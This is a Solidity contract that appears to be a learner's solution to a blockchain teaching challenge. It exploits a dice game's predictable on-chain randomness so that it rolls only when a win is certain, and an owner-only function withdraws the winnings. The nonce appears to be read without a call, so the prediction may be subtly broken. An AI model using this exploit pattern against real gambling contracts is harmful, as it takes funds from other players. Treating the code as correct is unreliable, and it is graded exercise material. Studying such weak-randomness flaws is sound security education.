pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }


    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        bool sent = payable(_addr).send(_amount);
        require(sent, "There was an error in the withdraw of the funds");
    }


    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public {
        
        require(address(this).balance >= 0.002 ether, "The contract doesnt have enough funds to play");

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce));
        uint256 roll = uint256(hash) % 16;
        
        require(roll <= 2, "The dice was not rolled");

        uint256 valueToSend = 0.002 ether;
        
        diceGame.rollTheDice{value: valueToSend}();
        
    }
    // Include the `receive()` function to enable the contract to receive incoming Ether. THis allow us to fund the contract from the faucet
    receive() external payable {}
}
